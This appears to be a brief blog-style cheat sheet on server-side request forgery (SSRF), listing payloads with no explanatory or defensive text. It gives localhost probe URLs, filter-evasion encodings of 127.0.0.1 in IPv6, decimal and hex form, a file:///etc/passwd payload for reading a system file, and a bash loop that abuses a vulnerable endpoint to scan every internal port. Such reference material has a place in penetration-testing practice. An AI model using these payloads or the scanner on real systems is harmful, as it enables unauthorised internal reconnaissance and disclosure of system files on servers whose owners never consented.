---
layout: post
title: "ssrf"
keywords: "ssrf, server side request forgery"
---
#### Detection
```
http://127.0.0.1:3306
http://localhost:3306
http://0.0.0.0:3306
```

#### Filter Evasion
```
http://[::]:3306
http://:::3306

http://2130706433:3306
http://0x7f000001:3306
```

#### Read File
```
file:///etc/passwd
```

#### Bash Port Scanner
```
for x in {1..65535};
    do cmd=$(curl -so /dev/null http://10.10.122.186:8000/attack?url=http://2130706433:${x} \
        -w '%{size_download}');
    if [ $cmd != 1045 ]; then
        echo "Open port: $x"
    fi
done
```